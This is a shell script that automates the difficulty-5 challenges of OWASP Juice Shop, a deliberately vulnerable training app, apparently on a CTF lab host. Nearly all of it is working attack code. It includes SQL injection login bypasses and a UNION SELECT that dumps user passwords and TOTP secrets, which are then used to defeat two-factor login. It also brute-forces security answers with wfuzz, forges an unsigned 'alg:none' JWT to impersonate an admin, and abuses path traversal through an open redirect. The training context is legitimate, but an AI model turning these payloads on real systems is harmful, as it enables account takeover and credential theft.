#/bin/sh

# Retrieve absolute path to this script
script=$(readlink -f $0)
scriptpath=`dirname $script`

# Define host IP ( the machine to attack ) and remote IP ( the machine which supports the attack )
target_ip="10.10.206.114"
attack_ip="10.9.5.12"
result_folder="/work/results/"

# Prepare environment
mkdir $result_folder 2>/dev/null


# Initiate session and cookies
echo "5.0 - INITIATING SESSION"
curl -s -X GET "http://$target_ip" -L -o /dev/null
curl -s -X GET "http://$target_ip/socket.io/?EIO=3&transport=polling&t=PE7d5_o" -c "$result_folder/5-cookies.txt" -L -o /dev/null
IO=$(grep io "$result_folder/5-cookies.txt" | awk '{print $7}')
echo "--> Session initiated with cookie IO ${IO}"
sed -i 's/#HttpOnly_//g' "$result_folder/5-cookies.txt"
echo "\n$target_ip\tFALSE\t/\tFALSE\t0\tlanguage\ten" >> $result_folder/5-cookies.txt
echo "\n$target_ip\tFALSE\t/\tFALSE\t0\tcookieconsent_status\tdismiss" >> $result_folder/5-cookies.txt


# Change Bender's password into slurmCl4ssic without using SQL Injection or Forgot Password
echo "5.3 - CHANGE BENDER'S PASSWORD"
curl -s -X POST "http://$target_ip/rest/user/login" -b "$result_folder/5-cookies.txt" -L -H "Content-Type: application/json" -d "{\"email\":\"bender@juice-sh.op'--\",\"password\":\"a\"}" -o $result_folder/5-bender.json
BENDER_TOKEN=$(jq -r '.authentication.token' $result_folder/5-bender.json)
echo "--> Authenticated as bender with token $(echo "$BENDER_TOKEN" | cut -c 1-20)...."
cp $result_folder/5-cookies.txt $result_folder/5-bender-cookies.txt
echo "\n$target_ip\tFALSE\t/\tFALSE\t0\ttoken\t$BENDER_TOKEN" >> $result_folder/5-bender-cookies.txt
curl -s -X GET "http://$target_ip/rest/user/change-password?current=&new=slurmCl4ssic&repeat=slurmCl4ssic" -b "$result_folder/5-bender-cookies.txt" -H "Content-Type: application/json" -H "Authorization: Bearer ${BENDER_TOKEN}" -L -o /dev/null

# Stick cute cross-domain kittens all over our delivery boxes.
echo "5.4 - CROSS-SITE IMAGING"
curl -s -X POST "http://$target_ip/rest/user/login" -b "$result_folder/5-cookies.txt" -L -H "Content-Type: application/json" -d "{\"email\":\"admin@juice-sh.op\",\"password\":\"admin123\"}" -o $result_folder/5-admin.json
ADMIN_TOKEN=$(jq -r '.authentication.token' $result_folder/5-admin.json)
echo "--> Authenticated as admin with token $(echo "$ADMIN_TOKEN" | cut -c 1-20)...."
cp $result_folder/5-cookies.txt $result_folder/5-admin-cookies.txt
echo "\n$target_ip\tFALSE\t/\tFALSE\t0\ttoken\t$ADMIN_TOKEN" >> $result_folder/5-admin-cookies.txt
# This one makes kitten appear
node $scriptpath/../../tools/playwright.js "http://$target_ip/#/deluxe-membership?testDecal=..%2F..%2F..%2Fredirect%3Fto%3Dhttp:%2F%2Fplacekittens.com%2Fg%2F400%2F500%3Fx%3Dhttp:%2F%2Fshop.spreadshirt.com%2Fjuiceshop" $result_folder/5-admin-cookies.txt > $result_folder/5-kittens.html 2> /dev/null
curl -X GET "http://$target_ip/#/deluxe-membership?testDecal=..%2F..%2F..%2Fredirect%3Fto%3Dhttp:%2F%2Fplacekittens.com%2Fg%2F400%2F500%3Fx%3Dhttp:%2F%2Fshop.spreadshirt.com%2Fjuiceshop" -b $result_folder/5-admin-cookies.txt -H "Authorization: Bearer ${ADMIN_TOKEN}"
# This one solves the challenge
node $scriptpath/../../tools/playwright.js "http://$target_ip/#/deluxe-membership?testDecal=..%2F..%2F..%2F..%2Fredirect%3Fto%3Dhttp:%2F%2Fplacekitten.com%2Fg%2F400%2F500%3Fx%3Dhttp:%2F%2Fshop.spreadshirt.com%2Fjuiceshop" $result_folder/5-admin-cookies.txt > $result_folder/5-kittens.html 2> /dev/null
curl -X GET "http://$target_ip/#/deluxe-membership?testDecal=..%2F..%2F..%2F..%2Fredirect%3Fto%3Dhttp:%2F%2Fplacekitten.com%2Fg%2F400%2F500%3Fx%3Dhttp:%2F%2Fshop.spreadshirt.com%2Fjuiceshop" -b $result_folder/5-admin-cookies.txt -H "Authorization: Bearer ${ADMIN_TOKEN}"

# Retrieve the language file that never made it into production.
echo "5.6 - EXTRA LANGUAGE"
locale -a > /tmp/languages.txt
sed '/\./d' /tmp/languages.txt > /tmp/languages2.txt
sed '/\@/d' /tmp/languages2.txt > $result_folder/5-languages.txt
# Add some other unusual languages...
echo "tlh_AA" >> $result_folder/5-languages.txt
echo "tlh" >> $result_folder/5-languages.txt
echo "en_XX" >> $result_folder/5-languages.txt
echo "en_PIRATE" >> $result_folder/5-languages.txt
echo "sjn" >> $result_folder/5-languages.txt
echo "eo" >> $result_folder/5-languages.txt
echo "lol_US" >> $result_folder/5-languages.txt
echo "en_LOL" >> $result_folder/5-languages.txt
echo "l33t" >> $result_folder/5-languages.txt
echo "en_1337" >> $result_folder/5-languages.txt
ffuf -u http://$target_ip//assets/i18n/FUZZ.json -w $result_folder/5-languages.txt -fs 1926 -o /tmp/5-languages.json
jq '[.results[] | .input.FUZZ]' /tmp/5-languages.json > $result_folder/5-languages.json


# Reset the password of Bjoern's internal account via the Forgot Password mechanism with the original answer to his security question.
# From facebook => Uetersen => Preunification zipcode
echo "5.13 - RESET BJOERN'S PASSWORD"
curl -s -X POST "http://$target_ip/rest/user/reset-password" -b "$result_folder/5-cookies.txt" -L -H "Content-Type: application/json" -d "{\"email\":\"bjoern@juice-sh.op\",\"answer\":\"West-2082\",\"new\":\"test123\",\"repeat\":\"test123\"}" -o $result_folder/5-bjoern.txt

# Reset Morty's password via the Forgot Password mechanism with his obfuscated answer to his security question.
echo "5.14 - RESET MORTY'S PASSWORD"
$scriptpath/../../tools/variations.sh -w Snuffles -w Snowball -o $result_folder/5-variations.txt
wfuzz -c -z file,$result_folder/5-variations.txt -d '{"email": "morty@juice-sh.op", "answer": "FUZZ","new":"test123","repeat":"test123"}' -H "Content-Type: application/json" -f $result_folder/5-wfuzz.txt --sc 200 --hc 401 http://$target_ip/rest/user/reset-password

# Deprive the shop of earnings by downloading the blueprint for one of its products.
echo "5.13 - RETRIEVE BLUEPRINT"
# Being able to retrieve the 19px image is what changes the challenge status to solved....
curl -s -X GET "http://$target_ip/assets/public/images/products/JuiceShop.stl" -b "$result_folder/5-admin-cookies.txt" -H "Authorization: Bearer ${ADMIN_TOKEN}" -L -o $result_folder/5-product.stl

# Solve the 2FA challenge for user "wurstbrot".
echo "5.15 - TWO FACTOR AUTHENTICATION"
curl -s -X GET "http://$target_ip/rest/products/search?q=none'))+UNION+SELECT+id,email,password,username,totpSecret,+''+AS+image,+'2024-12-16'+AS+createdAt,+'2024-12-16'+AS+updatedAt,+NULL+AS+deletedAt+from+Users--" -b "$result_folder/4-admin-cookies.txt" -H "Authorization: Bearer ${ADMIN_TOKEN}" -L -o $result_folder/5-credentials.json
TOTP_SECRET=$(jq -r '.data[] | select(.id == 10) | .deluxePrice' $result_folder/5-credentials.json)
echo "--> The 2FA token is $TOTP_SECRET"
curl -s -X POST "http://$target_ip/rest/user/login" -b "$result_folder/5-cookies.txt" -L -H "Content-Type: application/json" -d "{\"email\":\"wurstbrot@juice-sh.op'--\",\"password\":\"a\"}" -o $result_folder/5-wurstbrot-tmp.json
TMP_TOKEN=$(jq -r '.data.tmpToken' $result_folder/5-wurstbrot-tmp.json)
echo "--> The temporary token $(echo "$TMP_TOKEN" | cut -c 1-20)...." 
TOTP=$(oathtool --totp -b $TOTP_SECRET)
echo "--> The 6 digit code is $TOTP"
curl -s -X POST "http://$target_ip/rest/2fa/verify" -b "$result_folder/5-cookies.txt" -L -H "Content-Type: application/json" -d "{\"tmpToken\":\"$TMP_TOKEN\",\"totpToken\":\"$TOTP\"}" -o $result_folder/5-wurstbrot.json
WURSTBROT_TOKEN=$(jq -r '.authentication.token' $result_folder/5-wurstbrot.json)
echo "--> Authenticated as wurstbrot with token $(echo "$WURSTBROT_TOKEN" | cut -c 1-20)...."
cp $result_folder/5-cookies.txt $result_folder/5-wurstbrot-cookies.txt
echo "\n$target_ip\tFALSE\t/\tFALSE\t0\ttoken\t$WURSTBROT_TOKEN" >> $result_folder/5-wurstbrot-cookies.txt
node $scriptpath/../../tools/playwright.js "http://$target_ip/#/search" $result_folder/5-wurstbrot-cookies.txt > $result_folder/5-wurst.html 2> /dev/null

# Forge an essentially unsigned JWT token that impersonates the (non-existing) user jwtn3d@juice-sh.op.
echo "5.16 - UNSIGNED JWT"
NOW=$(date +%s)
THEN=$(date -d "+1 month" +%s)
TOKEN_HEADER="{\"typ\":\"JWT\",\"alg\":\"none\"}"
TOKEN_PAYLOAD="{\"status\":\"success\",\"data\":{\"id\":1,\"username\":\"\",\"email\":\"jwtn3d@juice-sh.op\",\"password\":\"0192023a7bbd73250516f069df18b500\",\"role\":\"admin\",\"deluxeToken\":\"\",\"lastLoginIp\":\"0.0.0.0\",\"profileImage\":\"assets/public/images/uploads/default.svg\",\"totpSecret\":\"\",\"isActive\":true,\"createdAt\":\"2024-12-17 16:07:51.260 +00:00\",\"updatedAt\":\"2024-12-17 16:07:51.260 +00:00\",\"deletedAt\":null},\"iat\":$NOW,\"exp\":$THEN}"
echo "$TOKEN_HEADER$TOKEN_PAYLOAD" > $result_folder/5-token.json
ENCODED_HEADER=$(echo "$TOKEN_HEADER"  | tr -d '\n' | base64 | tr -d '\n' | tr -d '=' | sed 's/+/-/g; s/\//_/g')
ENCODED_PAYLOAD=$(echo "$TOKEN_PAYLOAD"  | tr -d '\n' | base64 | tr -d '\n' | tr -d '=' | sed 's/+/-/g; s/\//_/g')
UNSIGNED_TOKEN="$ENCODED_HEADER.$ENCODED_PAYLOAD."
echo "--> Unsigned token is : $(echo "$UNSIGNED_TOKEN" | cut -c 1-20)...."
cp $result_folder/5-cookies.txt $result_folder/5-jwtn3d-cookies.txt
echo "\n$target_ip\tFALSE\t/\tFALSE\t0\ttoken\t$UNSIGNED_TOKEN" >> $result_folder/5-jwtn3d-cookies.txt
curl -s -X GET "http://$target_ip/profile" -b "$result_folder/5-jwtn3d-cookies.txt" -L -H "Content-Type: application/json" -H "Authorization: Bearer ${UNSIGNED_TOKEN}" -o /dev/null

# Compute score
echo "5.X - COMPUTE SCORE"
curl -s -X GET http://$target_ip/api/Challenges/?sort=name -b "$result_folder/5-cookies.txt" -L -o $result_folder/5-scores.json
SOLVED=$(jq '[.data[] | select(.difficulty == 5 and .solved == true)] | length' $result_folder/5-scores.json)
TOTAL=$(jq '[.data[] | select(.difficulty == 5 and .solved != null)] | length' $result_folder/5-scores.json)
echo "\n************* SOLVED : $SOLVED / $TOTAL *************\n"